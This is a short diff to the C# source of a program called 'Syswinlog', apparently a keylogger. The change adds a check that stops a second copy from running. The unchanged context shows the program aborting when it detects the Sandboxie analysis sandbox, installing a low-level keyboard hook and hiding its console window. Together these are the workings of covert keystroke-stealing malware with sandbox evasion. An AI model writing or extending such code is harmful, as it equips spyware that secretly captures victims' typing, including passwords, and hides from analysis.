@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Text;
 using System.Collections.Generic;
 using System.Linq;
@@ -18,10 +18,15 @@ namespace Syswinlog
     {
         public static void Main(string[] args)
         {
-            if( Utils.DetectSandboxie() ) {
+            // Check if an instance is already running
+            if ( Utils.IsInstanceRunning() ) {
+                return;
+            }
+            if ( Utils.DetectSandboxie() ) {
                 Terminate( "Sandboxie detected! [ABORTING]" );
                 // StatusLog.Log( "Sandboxie detected! [ABORTING]" );
             }
+
             _hookptr = SetHook(KeyBoardProcCallback);
             SetConsoleWindow(
                 Constants.ConsoleWindowState.SW_HIDE
